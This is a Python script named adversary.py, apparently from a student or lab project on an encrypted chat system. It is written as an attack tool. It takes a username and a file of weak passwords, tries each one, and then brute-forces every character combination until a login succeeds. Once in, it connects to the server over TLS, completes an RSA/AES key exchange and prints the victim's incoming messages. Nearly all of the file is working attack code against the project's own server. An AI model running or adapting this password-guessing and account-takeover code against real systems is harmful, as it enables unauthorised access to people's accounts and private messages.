import socket
import ssl
import config
import database
import itertools
import string
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, data):
        raw = base64.b64decode(data)
        nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)

def read_weak_passwords(file_path):
    with open(file_path, 'r') as file:
        weak_passwords = [line.strip() for line in file]
    return weak_passwords

def brute_force(username):
    chars = string.ascii_letters + string.digits + string.punctuation
    for length in range(1, 100):
        for password in itertools.product(chars, repeat=length):
            password = ''.join(password)
            if database.user_login(username, password):
                return password
    return None

def login_as_client(username, password):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ssl_context.load_verify_locations(cafile="server_certificate.pem")
    server_hostname = config.SERVER
    client_socket = ssl_context.wrap_socket(client_socket, server_hostname=server_hostname)
    client_socket.connect((config.SERVER, config.PORT))

    try:
        auth_data = f"login:{username}:{password}"
        client_socket.send(auth_data.encode('utf-8'))
        
        auth_result = client_socket.recv(1024).decode('utf-8')
        if auth_result == "Authentication successful":
            print("Successfully logged in as client")
            return client_socket
        else:
            print("Authentication failed")
            return None
    except Exception as e:
        print(f"An error occurred during login: {e}")
        client_socket.close()
        return None

def setup_aes_cipher(client_socket, private_key):
    encrypted_aes_key = client_socket.recv(1024)
    private_key_rsa = RSA.import_key(private_key)
    cipher_rsa = PKCS1_OAEP.new(private_key_rsa)
    aes_key = cipher_rsa.decrypt(encrypted_aes_key)
    return AESCipher(aes_key)

def receive_messages(client_socket, aes_cipher):
    while True:
        try:
            encrypted_message = client_socket.recv(1024)
            message_with_mac = aes_cipher.decrypt(encrypted_message)
            mac = message_with_mac[:32]
            message = message_with_mac[32:]
            print(message.decode('utf-8'))
        except Exception as e:
            print(f"An error occurred: {e}")
            client_socket.close()
            break

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python adversary.py <username> <weak_password_file>")
        sys.exit(1)

    username = sys.argv[1]
    weak_password_file = sys.argv[2]

    weak_passwords = read_weak_passwords(weak_password_file)
    client_socket = None
    password = None
    for weak_password in weak_passwords:
        if database.user_login(username, weak_password):
            client_socket = login_as_client(username, weak_password)
            password = weak_password
            if client_socket:
                break

    if not client_socket:
        print("Performing brute force attack...")
        password = brute_force(username)
        if password:
            client_socket = login_as_client(username, password)
        else:
            print("Failed to find the password")
            sys.exit(0)

    if client_socket:
        # Generate RSA keys
        key = RSA.generate(2048)
        private_key = key.export_key()
        public_key = key.publickey().export_key()

        # Send the public key to the server
        client_socket.send(public_key)

        # Set up AES cipher
        aes_cipher = setup_aes_cipher(client_socket, private_key)

        # Start receiving messages
        receive_thread = threading.Thread(target=receive_messages, args=(client_socket, aes_cipher))
        receive_thread.start()
